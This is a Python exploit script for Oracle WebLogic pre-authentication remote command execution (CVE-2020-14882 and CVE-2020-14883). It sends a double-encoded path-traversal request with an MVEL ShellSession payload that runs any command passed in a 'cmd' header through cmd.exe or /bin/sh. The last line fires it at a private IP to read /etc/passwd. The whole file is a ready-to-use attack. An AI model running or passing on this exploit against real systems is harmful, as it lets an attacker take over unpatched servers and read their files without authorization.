#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/12 21:41
# Author     : yunkong
# FileName   : cve_2020_14882_rce.py
# Description:
#
# Exploit Title: Weblogic Pre-Auth Remote Command Execution (CVE-2020-14882, CVE-2020-14883)
# Version: 10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0
# CVE: CVE-2020-14882, CVE-2020-14883

import http.client
import requests
import sys
import urllib3

urllib3.disable_warnings()  # 忽略https证书告警
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'

payload_cve_2020_14882_v12 = ('_nfpb=true&_pageLabel=&handle='
                              'com.tangosol.coherence.mvel2.sh.ShellSession("Weblogic.work.ExecuteThread executeThread = '
                              '(Weblogic.work.ExecuteThread) Thread.currentThread(); Weblogic.work.WorkAdapter adapter = '
                              'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
                              '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); Weblogic.servlet'
                              '.internal.ServletRequestImpl req = (Weblogic.servlet.internal.ServletRequestImpl) '
                              'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
                              'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
                              '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
                              '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
                              '("\\\\A").next(); Weblogic.servlet.internal.ServletResponseImpl res = (Weblogic.servlet.internal.'
                              'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
                              'res.getServletOutputStream().writeStream(new Weblogic.xml.util.StringInputStream(result));'
                              'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')


def exploit(url, cmd):
    payload = payload_cve_2020_14882_v12
    path = "/console/css/%252e%252e%252fconsole.portal"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                  'application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'cmd': cmd
    }
    try:
        requests.post(url + path, data=payload, headers=headers, timeout=10, verify=False)
        print('[+] Command executed successfully')
        return True
    except Exception as error:
        print('[-] Failed to execute command')
        return False


def vuln_exploit_start(target_url, command):
    if not target_url or not command:
        sys.exit('[*] Please assign url and cmd! \n')
    exploit(target_url, command)


vuln_exploit_start("http://192.168.12.130:7001", "cat /etc/passwd")
